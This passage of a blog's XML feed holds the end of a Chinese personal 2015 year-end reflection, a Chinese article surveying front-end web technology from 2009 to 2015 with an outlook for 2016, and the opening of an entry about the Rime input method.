        <content type="html"><![CDATA[<p>记得当初 17 岁刚进大学的时候，心中还充满了优越感，心想着：“青春啊，我要肆意挥洒这几年。” 没想到还没来得及挥洒，大学就已经过去了，没有多少留恋的东西，很平静地就过去了；当我走进社会，走进大公司实习的时候，心中又是一阵欢喜，“呀，都是师兄师姐辈份的哈~”，然而这一阵欢喜还没开始，时光荏苒两年飞逝，已经不敢再称自己为小鲜肉了…</p><p>我到现在还以为自己是去年毕业的，仔细回忆，中间其实还隔了一年。晃晃悠悠的，时间都去哪里了？我又从这些时间的夹缝中获得了什么？</p><span id="more"></span><h3 id="漂浮的状态"><a href="#漂浮的状态" class="headerlink" title="漂浮的状态"></a>漂浮的状态</h3><p>以前手机里头从来没有游戏，最近装了一个斗地主，由于运气太好，欢乐豆一直输不完，结果很多闲暇时间扔进了游戏堆；以前习惯不吃饭或者不睡觉，用一段很长的时间完成一个作品或者项目，现在按时吃饭，基本按时睡觉，大段的时间没有了，剩下的是零碎的时间片，而自己又不善于利用时间片；以前总是点头，你开心我满意。而现在总是摇头，摇一次头的代价就是更多的点头，点头和摇头之间，人也变得迷迷糊糊…</p><p>这一年，自己的情绪就像是一根波浪线，跌宕起伏，时而激情澎湃，时而低靡沉沦。在公司上班，拟定 KPI，照着大纲过日子；假日里的休闲，牵着女伴的手四处闲荡。有明确的方向，但是似乎也不怎么明确。</p><p>每次在给自己制定目标的时候，总怕苦了自己，往松里定，弹性排列，没有紧凑感，很松散，很随性。每次遇到问题的时候，总想着能回避便回避，不能回避干它两下再回避，躲躲闪闪地过日子，解决问题的能力看似提高了，实则是积攒问题的水平更强了。很多时候，解决了一个「复杂」的问题，恨不得给自己点 100 个赞，得瑟个三五六天，然后开始解决下一个「复杂」的问题，接着继续点赞，已经被朋友圈和微博的点赞功能薰陶到了极点，玩的神魂颠倒、不能自已！</p><p>凭着感觉过日子，这是近半年最大的感触。什么事情该做，什么事情不该做，脑子里一闪而过，结论也就出来了。可以说是思维敏捷，似乎更多的是头脑发热，瞎指挥自己的身体和嘴巴。「凭感觉」就是一种长期经验沉淀的习惯，这是一种埋藏在潜意识下的反射弧，反射弧在脑子里放多了就容易出毛病。要知道，活在自己的经验里是一件相当无趣的事情，不用思考，习惯性地动作，动作次数一多就显得特别臃肿，特别多余。</p><p>我喜欢换场景。就像念书的时候，我不喜欢总是坐在一个地方，这个月坐在第一排，下个月还让我坐在第一排，就很不习惯。我喜欢换着法去玩，有变化才会有刺激。人就是缺乏刺激才变得迟钝。</p><p>2015 年，很多时候，自己处于漂浮状态，很离散。</p><h3 id="更加专注地做事情"><a href="#更加专注地做事情" class="headerlink" title="更加专注地做事情"></a>更加专注地做事情</h3><p>生活和工作中有太多重复的事情了，我要想办法融合掉。比如，我每天要花 5-20 分钟，处理团队博客的问题，催稿、发文、改文、传播、传播、再传播、自己咀嚼等，这个过程每天重复着。类似这样的流程，我要写一套自动化程序来处理。不能用编程解决的问题，要用规范、规则去处理。</p><p>还有很多重复的事情，必须每天坚持做。比如，健身，准时睡觉。</p><p>把紧急的事情和重要的事情分的更加清楚。将更多时间投入到重要的事情，这可能需要自己换一个身份。</p><p>2016 年，我打算把时间花得更加划算。只专注几件事情，做好它，一直做。</p><p>嗯，30 分钟的总结时间，就这么多，得去睡了！ 2016，加油！！！</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 展望 </tag>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>近几年前端技术盘点以及 2016 年技术发展方向</title>
      <link href="/blog/2015/12/10/after-framework-we-gonna-to-hug-data/"/>
      <url>/blog/2015/12/10/after-framework-we-gonna-to-hug-data/</url>
      
        <content type="html"><![CDATA[<p>Web 发展了几十个春秋，风起云涌，千变万化。我很庆幸自己没有完整地经历过这些年头，而是站在前人的肩膀上行走。Web 技术发展的速度让人感觉那几乎不是继承式的迭代，而是一次又一次的变革，一次又一次的创造。这几年的前端，更为之甚！</p><p>我从 12 年底开始接触前端，12 年之前的前端发展情况只能从上一辈的笔触中领会。本文会盘点从 09 年开始到 15 年间前端技术的革新，同时也会从多个角度，解读近几年前端技术发展的潜在因素，其中穿插了若干对前端演进的拙见，难免会有错误和疏漏，望读者可以补充和斧正。</p><span id="more"></span><h3 id="那些年，一度追捧，一度放弃"><a href="#那些年，一度追捧，一度放弃" class="headerlink" title="那些年，一度追捧，一度放弃"></a>那些年，一度追捧，一度放弃</h3><p>下面，花一些篇幅简单回顾下 09 年到 15 年前端的发展历程（Update: 2016&#x2F;01&#x2F;03, 感谢@法海 师兄对文章部分内容的校稿，很多技术出现的时间有所偏差，但不影响阅读）。</p><h4 id="09-年，基础类库完善，寻求突破"><a href="#09-年，基础类库完善，寻求突破" class="headerlink" title="09 年，基础类库完善，寻求突破"></a>09 年，基础类库完善，寻求突破</h4><p>09 年之前，JavaScript 还处于对自身语言的完善过程中，而到了 09 年，JavaScript 类库已经颇为成熟，jQuery&#x2F;Prototype&#x2F;&#x2F;Dojo 等都已经发布了好几个 stable 版本，各大类库也是相互吸收优点，不断完善并提高自身性能，然而功能上已经没有太多增加的势头。部分框架开始了思想上的转变，更加注重前端开发的组织和结构，条理性强了很多，如 YUI 等。</p><p>从 ECMAScript 规范的争执，开启了浏览器引擎大战，各大厂商也趁机瓜分 IE 份额，Chrome 和 Firefox 在这场战役中取得大胜，V8 也敲响了前端的大门。为了迎合市场的激烈竞争，IE 开始了升级之旅，09 年初发布 IE8，全面兼容 CSS2.1。</p><p>而此时，Node.js 和 3G Mobile 这两只巨兽开始浮出水面，Web 标准也开始向 HTML5、ECMAScript5.0 靠拢。</p><h4 id="10-年，看齐标准，关注-Web-性能"><a href="#10-年，看齐标准，关注-Web-性能" class="headerlink" title="10 年，看齐标准，关注 Web 性能"></a>10 年，看齐标准，关注 Web 性能</h4><p>毫无疑问，这一年，各大巨头都看清了 HTML5 是 web 发展的未来，在保留原来前端技术的状态下，都簇拥着拉扯 HTML5 的裙摆。富客户端应用也在这一年蓬勃生长，ExtJS&#x2F;Dojo 摇身变为企业级框架，各类组件化概念和产品如约而至。</p><p>延续着 09 年的变化，10 年的前端显得颇为沉寂，然而在标准的运用和推动上，各大厂商也是十分卖力。IE 9 出来了预览第三版，iPhone 的 Safari 已经能够支持众多 HTML5 内容：Canvas&#x2F;Video&#x2F;Audio&#x2F;Geolocation&#x2F;Storage&#x2F;Application Cache&#x2F;Web SQL Database 等。</p><p>W3C 宣布成立 Web 性能工作组，Google 和 Mozilla 纷纷推出应用商店，浏览器调试工具也丰富了起来，人们开始更多地关注开发体验和性能问题。</p><h4 id="11-年，HTML5-扛大旗，Flash-堪忧"><a href="#11-年，HTML5-扛大旗，Flash-堪忧" class="headerlink" title="11 年，HTML5 扛大旗，Flash 堪忧"></a>11 年，HTML5 扛大旗，Flash 堪忧</h4><p>2011 年 HTML5 的技术发展和推广都向前迈进了一大步，语义明确的标签体系、简洁明了的富媒体支持、本地数据的储存技术、canvas 等等各类技术被广泛应用。这一年，很多 web 开发者也面临一项技术的抉择，HTML5 or Flash？从 Flash Player 11.1 开始，Adobe 不再继续开发面向移动设备浏览器的 Flash 插件，积极投身于 HTML5，这意味着 Flash 技术的凋零。</p><p>这一年，HTML5 游戏火爆到了一个高潮，移动端开发工具和调试工具也日益成熟。jQuery 已经成为大小公司日常开发的标配，成千上万的 JQ 插件让网页开发变得尤为轻松，而随之而来的也是页面的臃肿和性能调优的深入探索。</p><p>Node.js 已经悄然崛起，在 github 上的访问量已经超过了 Rails，国内的云应用开始尝试使用 Node.js，Node.js 相关工具也纷纷出来。</p><h4 id="12-年，响应式开发，工程化推进"><a href="#12-年，响应式开发，工程化推进" class="headerlink" title="12 年，响应式开发，工程化推进"></a>12 年，响应式开发，工程化推进</h4><p>随着硬件技术的发展，各手机厂商又开始骚动起来，为了占有更多的市场，不断提高产品的性价比，体验也得到了不断的优化。借着先前两年 HTML5 刮起的东风，移动端上的 web 开发也颤抖了起来。移动端的开发挑战不亚于 PC 上对多个浏览器的支持，这一年，萌生了众多移动端框架，如 Sencha Touch&#x2F;Zepto.js&#x2F;JQ Mobile 等，相对 PC 端框架，它们更加轻便。</p><p>而移动端的崛起，带来了许多终端开发难题：多终端适配，多分辨率适配，远程调试等等，而随着这些难题一个个被解决，移动端生长的势头变得更加强盛。此时 Twitter 也推出了 Bootstrap， 这个前端开发工具包不仅方便了前端，也方便了后端同学，它的出现让快速建站更加简单。</p><p>编程思想的切换，迎来了 CoffeeScript 和 TypeScript，这两个预处理语言的出现又为 JavaScript 引来了不少其他方向转型过来的开发者。JavaScript 的兄弟 Node.js，也在命令行领域开拓了一片不小的疆域，甚至有动摇 Perl 和 Ruby 地位的趋势。</p><p>在前端工程化上，几个派系相互争斗，产出了 AMD、CMD、UMD 等规范，也衍生了 SeaJS、RequireJS 等模块化工具。前端在这一年很有跳跃感。</p><h4 id="13-年，爆发式增长，百花齐放"><a href="#13-年，爆发式增长，百花齐放" class="headerlink" title="13 年，爆发式增长，百花齐放"></a>13 年，爆发式增长，百花齐放</h4><p>规范和标准上有不少产出。Web Components 的出现给前端开发开辟了新思路；WebDriver 规范的出来推动了自动化测试的进程，ECMAScript 6 的规范草案落地，Webapp 工作小组在这一年也是相当活跃。</p><p>Chrome 浏览器在这一年也有了很大的突破，开始支持 SPDY，使用 Blink 取代 webkit 作为 Chromium 的新渲染引擎，Chrome DevTools 的调试体验大幅度提升。这一年中，Chrome 连同其他浏览器厂商快速推动了各项草案规范的实现。</p><p>语言能力上依旧在增强，并且从 JS 开始扩散到 CSS，LESS、SASS 和 Stylus 等 CSS 预处理语言开始走俏，Web 开发变得更加紧凑。</p><p>而在无线端，应用不再局限于 Webapp，由于流畅度、性能等方面不能满足用户体验的需求，各大公司开始转向 Native 方向的研究，进而出现了 Hybrid 和 PhoneGap 的繁荣，它们为 JS 调用了提供更多的设备 API。</p><p>Node.js 大放异彩，很多公司在生产环境中使用 Node.js，同时也出现了诸如 Express、Meteor 等小巧的快速搭建 Node.js Server 的应用框架。</p><p>各浏览器的调试也是种类繁多、功能丰富，PhantomJS 在自动化测试上开始取代 Selenium，出现了众多的远程调试方案和工具。</p><p>前端工程化开始普及，各公司开始推出自己的前端集成开发解决方案。</p><h4 id="14-年，移动端的崛起，HTML5-和-ES6-落地"><a href="#14-年，移动端的崛起，HTML5-和-ES6-落地" class="headerlink" title="14 年，移动端的崛起，HTML5 和 ES6 落地"></a>14 年，移动端的崛起，HTML5 和 ES6 落地</h4><p>HTML5 正式定稿，这意味着，web page 正式演变为 web application。ES6 华丽丽走进前端，走的很稳重，它的 Module&#x2F;Class 等特性已经完全让这门语言具备了开发大型应用的能力。</p><p>大而厚的基础库难以满足灵活场景，Mobile 要求极致体验，MV* 库铺卷而来，如 vue&#x2F;angular&#x2F;knockout 等。</p><p>Web Components 跨终端组件快速发展，移动端开发迎来一次升华。Node.js 前后端分离的流行，中间层的出现改变了前后端的合作模式。2014 是颠覆式的一年，前端发展在这一年开始形成了一个短暂的稳定格局。</p><h4 id="15-年，观念的转变，步入前端工业化生产"><a href="#15-年，观念的转变，步入前端工业化生产" class="headerlink" title="15 年，观念的转变，步入前端工业化生产"></a>15 年，观念的转变，步入前端工业化生产</h4><p>今年格外引人注目的框架是，类 React。Facebook 在 React.js Conf 2015 大会上推出了基于 JavaScript 的开源框架 React Native，它结合了 Web 应用和 Native 应用的优势，可以使用 JavaScript 来开发 iOS 和 Android 原生应用。在 JavaScript 中用 React 抽象操作系统原生的 UI 组件，代替 DOM 元素来渲染等。敲一次代码，能够运行在多个平台上，其优势可见一斑。除了 React ，还有手机淘宝推出的 Weex 框架，它吸收了 vue.js 的编程精华，编程风格更加简约。</p><p>在众多构建工具中，如今潇洒存活的并不多。体验完 grunt 和 browserify 后，gulp 顺势而至，尔后又出现了 webpack、jspm 等。而包管理工具，经历了 components、bower、spm 后，npm 开始主导整个市场。</p><p>Node.js 的应用已经铺天盖地，各大公司前端都把 Node.js 作为分离前后端的主要手段，并且在测试、监控等方面沉淀了大量内容。不过，这个市场是很苛刻的，Node.js 的性能难以达到 C&#x2F;C++ 的水平，那么接下来要做的就是要提升性能，至少得接近 C&#x2F;C++。</p><p class="barretSay"><b title="Taobao FED 同事 - 法海">@法海</b> 师兄批注：对时间点的总结是，其实很多技术方案很早就出现了，只不过没有大规模应用，因此，对于上文中时间点的谬误，你可以将语句从「xxx 出现了」改成「xxx 得到广泛应用」。其实我发现，问题在于，一个技术领域的新起和发展并不是一年内能完成的，一个技术方案的出现和广泛应用也不是一年内能落地的，所以执着于以「年」为时间点来编史，会画地为牢。</p><h3 id="Web-规范和标准"><a href="#Web-规范和标准" class="headerlink" title="Web 规范和标准"></a>Web 规范和标准</h3><p>最开始，我们看到的 JavaScript 还只是一个简单的脚本语言，配合着 AJAX，在网页上翻腾了好几个年头。随着互联网趋势越来越明显，互联网业务量和业务复杂度不断增加，很多网页变得相当复杂，如让我们震惊了好一会儿的 Gmail，交互复杂，体验优良。为了更好的多人协作，代码中的 Utils 库越来越大，在这些库中，基础部分更多的是对 JavaScript 语言本身的拓展，比如给 String 加一个 repeat 函数，再加一个 trim 函数，再加一个 endWith 函数等等。</p><p>复杂的业务中会经常看到一层又一层的回调处理，回调的嵌套让代码的可读性变的很差，而且很难将多个异步并行处理。为了改变这种编程范式，我们做了很多的思考，使用事件监听，使用各种手段拉直回调，平坦地调用。</p><p>慢慢的，如果你在关注 W3C 小组的动向，会发现，那些被认可的，并且被广泛重复定义的东西，都被纳入了标准。最开始的 jQuery&#x2F;prototype，前者主要是对浏览器做兼容处理，让开发者不再把精力放到浏览器的差异上；后者是对语言本身的拓展，对 JavaScript 各种类型做拓展，并且提供了一套拓展任何对象的功能集。而现在的开发，我们很大程度上不再依托这些类库。规范和标准已经把这些差异都统一了，String 中自带了 includes&#x2F;startsWith&#x2F;endsWith&#x2F;repeat&#x2F;padStart&#x2F;padEnd 等函数，Array 自带了 from&#x2F;forEach&#x2F;of&#x2F;keys&#x2F;values&#x2F;find&#x2F;findIndex 函数…</p><p>规范的标准是为了让开发者得到更好的编程体验，编程不是目标，目标是将编程生产力转化成实际效益，越少的阻碍对开发者越有利。各浏览器厂商当然也认识到了这一点，他们不断地提升自己产品的体验，将标准中的新特性都融合进去，比如 ES6 中的 Promise&#x2F;Generator&#x2F;Class&#x2F;Module 等等。在这些内容普及之前，我们不需要加入 jQuery&#x2F;prototype 这些「不纯粹」的东西，而是添加两个 shim 和 polyfill，如 es5-shim，html5shiv 等等。待到山花烂漫时，再轻松删掉这些补丁程序。</p><p>这两年工程化很热，W3C 小组也看到了，这就是市场的需求，为了完成一个大型应用的编程，就必须模块化、组件化，于是在规范中也出现了 Module &amp; Module Loader；Node.js 的到来，让很多前端工程师开始接触数据库操作，面对巨量的异步，我们忍气吞声写了无数的回调地狱，尽管使用了很多 Promise 相关的操作，程序结构依然松散难以阅读，于是规范中也开始出现了 async&#x2F;await 等对 Generator 的上层封装。文字已经不能满足当代人的沟通需求，音视频等富媒体传输走进了我们的生活，于是规范中也出来了 WebRTC&#x2F;WebAudio 等规范。</p><p>只要规范出来了，后续市面上就会根据规范来实现一套 shiv，这些 shiv 提供了同样的 API，提供了同样的编程体验。当浏览器自我进化完成之后，这些 shiv 也将成为历史，被开发者遗弃在代码的注释之中。这些都是规范和标准的魅力，它的存在，就是让开发者把精力投入到自己的业务之中，编程和范式的工作交给它。</p><p>在 <a href="http://www.w3.org/TR/tr-date-all">这里</a> 可以看到，W3C 各个小组最近都在干啥。标准不能囊括一切。</p><h3 id="生态的自我完善和自我拓展"><a href="#生态的自我完善和自我拓展" class="headerlink" title="生态的自我完善和自我拓展"></a>生态的自我完善和自我拓展</h3><p>技术的更迭过于频繁，我们能够清晰地看到，很多人还在用更迭前一波甚至是前好几波的产品。</p><p>当年的 IE6，在战场上鏖战了 10 多个年头，依然屹立不到，而现在它在市面上依然有百分之一左右的占有率，这种小强精神不得不让人肃然起敬。“只要用户在，我们就得追随”，这可能是很多公司的服务理念，因为用户就是潜在的利润。正是因为这种服务理念，成就了 IE6 一个又一个的 5 年！然而低本版的 IE 已经不仅仅是被前端从业人员抵制和排斥了，网络安全、网络运维、QA 等等，各个技术岗位的人员都开始对他不屑，它的存在对工作效率、对安全、对很多方面产生了极为不良的影响，甚至影响到一些核心内容的推广，所以 2016 将是低版本 IE 消亡的一年，我也呼吁业界所有的朋友举起义旗反抗起来！</p><p>庆幸的是，也有人开始吃螃蟹了。从支付宝到天猫到淘宝，阿里巴巴在很多业务上已经主（bèi）动（bī）地放弃了对 IE6 和 IE7 的支持，甚至在统一接入层直接做了 302 跳转，提示用户更新浏览器或者引导流量到无线端。这是一个好的开始，我们期望这也是业界达成共识的开始！</p><p>HTTP 协议，从 1.0 快速过度到了 1.1，整个互联网的上层建筑变的十分稳固。当然，我也了解到依然有很多产品还是保持了 1.0 的状态，据说电信公司的很多产品就是使用 HTTP&#x2F;1.0 进行通讯，这无疑让人惊愕。为了追求更高的效率，减少网络传输中的无效流量，W3C 工作组对 HTTP 协议也做了重新的定义，SPDY 就是 13 年比较火热的一个话题，Firefox 和 Chrome 都陆续开始支持 SPDY，后来在 SPDY 的基础上做了升级，正式定义为 HTTP&#x2F;2.0，它的一个很大特点就是多路复用，这个小小的特点改变了我们前端编程的很多优化模式，比如</p><ul><li>域名不是越多越好，为了能够充分利用浏览器的连接数，我们给 JS 和 CSS 开一个域名，给 img 开好几个域名，网页打开的时候，恰到好处的利用浏览器的连接数上限限制。HTTP&#x2F;2.0 的多路复用，就是可以在一个 HTTP 请求中进行多个资源的传输，如果域名散列，反而不能利用这个特性</li><li>资源合并没有任何优势，以前的资源合并是为了减少请求数以节约建立 TCP 链接的网络开销和头部传输的流量开销，而在 HTTP&#x2F;2.0 中，一个 HTTP 请求上完全可以把所有的资源全部推送过来，如果合并了资源，反而不能良好运用浏览器对资源的缓存。</li></ul><p>当然，除了多路复用，还有很多其他的优化，比如传输的数据为二进制流，HEAD 头会被压缩处理，服务器可以向客户端推送内容等。在这个技术水平指数式增长的年代，我相信以后的革新不会比消灭 IE6 痛苦。</p><p>模块加载上，经过了各派系的争论之后，流传下来几个不错的产品 SeaJS、RequireJS 等，那么那个模块加载器将成为工具平台中短暂的终点呢？似乎这些都不是。当我们按照规范中的方式进行模块定义，按照规范中的方式加载定义的模块时，加载这个流程就显得不那么重要了，因为这些事情最后都会变成 shiv&#x2F;polyfill 的事情，最终会变成浏览器的固有属性。</p><p>当一个东西在社区中被暴力追捧的时候，会有很多衍生的产品出来，当这些衍生物根深蒂固时，可能又会出现一个更加原生更加符合开发习惯的东西出来。就像 jQuery，我们为它编写的插件不计其数，而在工程化的需求冲击下，它却显得那么的弱不禁风，因为它关注的点和当前的发展态势不太吻合，仅此而已。</p><h3 id="Mobile-的发展驱动着战场的转移"><a href="#Mobile-的发展驱动着战场的转移" class="headerlink" title="Mobile 的发展驱动着战场的转移"></a>Mobile 的发展驱动着战场的转移</h3><p>记得当年拿着 Nokia5230 学完了 HTML 和 JavaScript 的入门，那屏幕尺寸也就是三个手指的宽度，紧紧攥在手里看着页面混排效果极差的网页文档。</p><p>现如今，iPhone 都出到 6s 了，一个版本一个尺寸，而且尺寸越来越大，还有各种宽高不一的 Android 机器，种类繁多。以前的触屏是电阻式，只支持单点触碰；而现在电容式的触屏精度更高，还支持多指触控，这如丝般顺滑的体验在三四年前是完全体会不到的。曾经手机开一个程序久了就会卡，动不动还会自动重启；而现在的手机开一堆程序，完全无感知，这就是硬件发展前后的差异。</p><p>手机已经成为了人们生活中不可或缺的一部分，甚至成为了一些人身体的一部分，淘宝今年双十一的数据显示，国内移动端的消费比例已经远远超过了 PC 端，占比 68%。面对庞大的用户，我们的技术是否做好了充足的准备，这里还得打一个问号。</p><p>PC 上那一套经验不是直接搬到移动端就可以使用了，在移动端还需要解决更多的问题：</p><ul><li>多分辨率问题，这里涉及到了响应式设计和前端响应式技术</li><li>不同网络环境的网页加载优化问题，2g&#x2F;3g&#x2F;4g&#x2F;wifi</li><li>手指交互带来的一系列体验问题</li><li>为了提升用户体验，将 Web Native 化 —— 类 React 技术带来的一系列问题</li><li>远程调试问题</li><li>移动安全问题等等</li></ul><p>上面提到的问题很多已经有了优秀的解决方案，当然也有很多未提及的。WebApp 的性能、流畅度和稳定性远远不如原生应用，同时它也无法良好地运用设备提供的原生功能，这些都是大家转投 Native 的原因。</p><h3 id="端的融合"><a href="#端的融合" class="headerlink" title="端的融合"></a>端的融合</h3><p>不同分辨率的手机，不同物理尺寸的终端，为了保持良好的视觉体验和用户体验，我们不得不为每一个尺寸写一份 Media Query 代码，那么对应的，设计师也需要设计多套版式供前端使用，这给设计师、前端和测试带来了无尽的麻烦。为此，我们通过前端技术重塑屏幕，重新定义像素尺寸，使用流式布局，通过百分比来响应不同的终端尺寸。这是端的融合。</p><p>后续的 Mobile 的技术发展方向上，应该是相当明确的。很多公司都是三套人马维护三端的程序，iOS、Android 和 Web，而这三端做的事情都是一样的，一样的界面，一样的后端接口，一样的交互方式。为了能够快速响应业务的变更，我们不得不将三端合并为一端对待，用一套程序编程成三端代码，然后发布到三个平台上。这也是端的融合。React 系列技术发展到此，绝对不是终点，它只是一个探路灯，给我们照明了方向。</p><p>技术需要为业务做保障，而好的技术是能够及时响应业务的变化，我们不可能投入大量的人力在 Web 的修补工作上，通过开发统一工具，屏蔽端和端之间的差异，统一开发模式和开发体验，这才是 Mobile 的未来。</p><p>当然，回到我们之前说的规范和标准，我们目前所做的「屏蔽差异」工作，今后，也会有统一的标准来规范，目前手机厂商没有这个共识，是因为还处于当年 Chrome、Firefox 抢占 IE6 市场份额的阶段。端的最终融合在于一个统一的标准，以及强有力的执行。</p><h3 id="栈的融合"><a href="#栈的融合" class="headerlink" title="栈的融合"></a>栈的融合</h3><p>我刚接触前端的时候，还没有听说「全栈」，Web 技术栈往小里说，包含了从前端设计、交互、前端实现、网络数据传输、后端实现、后端运维和数据库等几个方面，能短时间内从无到有实现这么一套系统，并且能够抗得住一定流量冲击的人，我们可以称之为全栈工程师。能够有架构有条理地实现这套系统，并且抗得住大流量、有集成测试、有监控的，这种我们可以称之为资深全栈工程师。现在不乏这种人才，也不乏自吹为这种人。</p><p>栈的融合得益于 Node.js 的出现，作为前后端分离的桥梁，它拉近了前端工程师与后端的距离，有的人在这座桥梁上卖力行走，渐渐的也从前端走进 了后端，甚至走进了后端的运维。至此，前端也拥有了部署和发布整个应用的能力，这是一个质的突破。</p><p>使用 Node.js，简单几行程序便能实现一个 web 服务器、便能搭建一个多人聊天的网页，它的便捷性可见一斑。NPM 社区的发展，沉淀了成千上万的组件包，一行命令即可获取，这种组件拼凑式的开发，任何功能的实现都不会显得太复杂，而这里的「不复杂」也蕴含了无数的坑坑洼洼，在这一层的融合上也会遇上不少阻碍：</p><ul><li>冗余的庞大的包内容，为了使用一个小功能，我们从网络上拉取下来一个巨大的包，而且这里的「巨大」对很多人来说都是无感知的，很少会有人进入 node_modules 去查看依赖的第三方包是如何实现的，实际情况可能会相当震撼，第三方包还引用了一堆第三方包，这些包都会在 Node.js 执行的时候被收纳进去，放在内存中。</li><li>猛烈的迭代，今年的 Node.js 被人嫌弃迭代太慢了（当然，这是表面原因），走出了一个分支 io.js，发展了一会儿，进度赶超了 Node.js，后来觉得一家人不干两家活，又合并回去了。虽说上层 API 几乎没有变化，但是底层却被翻了一个天。</li><li>偶尔的巨大漏洞，每隔一端时间就会暴露 Node.js 存在漏洞，这些漏洞的补救措施就是立即升级版本号，比较让人担心受怕。</li><li>后端意识不强烈，前端占领了中间层的开发，有的时候还干这后端的活儿，然而却没有后端沉淀多年固有的意识，测试和监控做的相当潦草。</li></ul><p>JavaScript 从客户端的脚本语言纵身跃进进入了后端行列，而今也开始深入到移动端 Native 领域，确实是无孔不入，这可能就是语言的特性，也可能是技术本身就在寻求融合点，把有差异的地方全部躺平，然后用统一的方式去关注业务，关注用户。端和栈也在融合。</p><h3 id="后端服务化，云数据，云安全"><a href="#后端服务化，云数据，云安全" class="headerlink" title="后端服务化，云数据，云安全"></a>后端服务化，云数据，云安全</h3><p>用户体验变得越来越重要，响应式技术的发展也是后续网页应用的一大特点，端和端之间的差异只是在表现上，数据这一层差异不是特别大，很多应用 PC 和 Mobile 共用一套接口，或者 Mobile 的接口在 PC 接口的基础上做了一层包装，对接口字段做了些许删减。后端为了响应各个端之间的数据需求，也需要关注数据的可利用性，接口包装的拓展性等，这是后端服务化的一个表现。移动端的开发上，前后端间隙十分明显，越来越多移动端应用的发布已经脱离了后端，前端完全通过异步方式获取数据。</p><p>业务变化很快很快快，今天这个产品被并购，明天那个业务被砍掉，每个人负责的业务线可能冷不丁地就变了。很多大公司的决策是由上往下的，上面微动，下面可能就是大动，可能某个部门就不存在了，也可能被划分成几个产品部门。</p><p>所以「大后台，小前台」的趋势必然形成。前端，毫无疑问，在这个前台之中。前台的特点是灵活的，多变的，可快速重组的。对后台而言，为了响应前台的变化，需要提供更细粒化的 API，将数据打散，打得更加零碎，零碎的数据易于重组，这是在考验后端的架构能力。如今，很多前端也都是半栈工程师，盘踞在前后端中间层上，然而如何迎接这种后端服务化的模式，似乎这个准备还是不够充足的。</p><p>GraphQL 的出现场景跟 React 类似，React 是前端应对不同场景的一种强有力手段，而 GraphQL 则是后端应对不同需求场景的一次尝试，Web APIs 将会成为 Web App 和 Mobile App 的一个中心点，前端基于后端的 RESTful 服务构建应用，这里面存在太多未知的问题需要探索，这是一个大数据下探索的新起点，也给前端开发者创造了无数的可能。</p><p>这几年各类网盘，各个云服务商都在抢占市场，有提供图片储存的，有提供 CDN 静态资源缓存的，有提供大文件储存的，也有卖数据库服务的。种类繁多，而归根到底都是，你付钱给我，我提供储存和安全，还提供方便的 SDK 让你获取自己的数据。云服务卖的是一套服务，它是把所有人的数据风险集于一身，用强硬的技术做安全防御。云，赋予了我们无穷的想象空间。</p><h3 id="三辆马车，我们还差一辆"><a href="#三辆马车，我们还差一辆" class="headerlink" title="三辆马车，我们还差一辆"></a>三辆马车，我们还差一辆</h3><p>开发功能对很多人来说是轻松活儿，基本的前端语言加些复杂的特效，实现成本不会很高；即便是搭建一个网站，使用 Node.js 社区中的框架也能够轻松实现。然后极少人会去关注每个功能点的测试，一个项目下来基本看不到测试用例，更不用说会去做监控相关的事情。结果就是，踏过了无数的坑洼之后终于上线了，而后续加功能的时候发现，加了东西就跑不通，新内容影响了之前的逻辑，只好去修复之前的逻辑，修好之后发现更早之前的逻辑又不通了，整个修复过程就像玩多米诺骨牌。</p><p>程序开发三板斧：功能、测试和监控。在 github 上可以看到很多程序都加入了持续集成，这是一个好兆头，意味着我们写的程序也越来越健壮，至少贡献给世人使用的程序是健壮的。很多程序的代码覆盖率也达到了 90%+，这些数据都是重视测试的证据。</p><p>然而，三辆马车，我们最后一辆依然没有开动起来。很多公司都会有自己的 log 平台，每个用户访问页面中的任何一个链接都会将用户信息和访问信息以 log 日志形式收集到 log 平台上，然后通过监控平台或者离线分析的方式，获取业务数据或者技术数据，进行分析和二次开发。这些东西在大公司见的很多，而这方面的东西在前端，尤其是使用 Node.js 做程序开发的前端身上，看到的并不多。</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>2016 年，我觉得技术上的新创造会稍微缓和些，这两年很多人已经被新技术冲击得有些找不着方向了，同一类东西，前者还没学完，后者就开始火爆了，紧接着又是一阵技术的凋零和新技术的出现，这样搞久了也会有一丝的疲倦。而更多的会关注，如何更好地服务多端，如何更大幅度地提升开发体验和用户体验，很多技术都会往性能、往极致这个方向上钻研。</p><p>写长文真不轻松。写到这里，感觉说的不通透，还有很多想说的，但是个人理解力有限，也难以表达全面。技术的变化很快，今天说过的东西，到了明天就可能过时了。我们猜不透未来，只能把现有的东西好好消化吸收下，留下一个话柄，给读者吧。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="http://hikejun.com/blog/2010/02/08/2009%E5%B9%B4%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF%E9%A2%86%E5%9F%9F%E5%9B%9E%E9%A1%BE/">http://hikejun.com/blog/2010/02/08/2009年前端技术领域回顾/</a> By 张克军</li><li><a href="http://www.infoq.com/cn/news/2011/01/infoq-2010-front-end-sum">http://www.infoq.com/cn/news/2011/01/infoq-2010-front-end-sum</a> by 崔康</li><li><a href="http://developer.51cto.com/art/201112/307846.htm">http://developer.51cto.com/art/201112/307846.htm</a> by 七武海</li><li><a href="http://www.csdn.net/article/1970-01-01/2815164">http://www.csdn.net/article/1970-01-01/2815164</a> By 李晶</li><li><a href="http://cnberg.com/archive/2013-fe/">http://cnberg.com/archive/2013-fe/</a> By Berg</li><li><a href="http://www.infoq.com/cn/articles/2014-review-front-end-part">http://www.infoq.com/cn/articles/2014-review-front-end-part</a> By 黄丹</li><li><a href="http://medium.com/@shijuvar/web-development-trends-for-2015-and-beyond-c2d3c1ef5718">http://medium.com/@shijuvar/web-development-trends-for-2015-and-beyond-c2d3c1ef5718</a> By Shiju Varghese</li><li><a href="http://github.com/kuitos/kuitos.github.io/issues/32">http://github.com/kuitos/kuitos.github.io/issues/32</a> By Kuitos</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 网络技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技术前瞻 </tag>
            
            <tag> 前端发展 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>换新的输入法，Rime</title>
      <link href="/blog/2015/11/20/new-input-methed-rime/"/>
      <url>/blog/2015/11/20/new-input-methed-rime/</url>
      
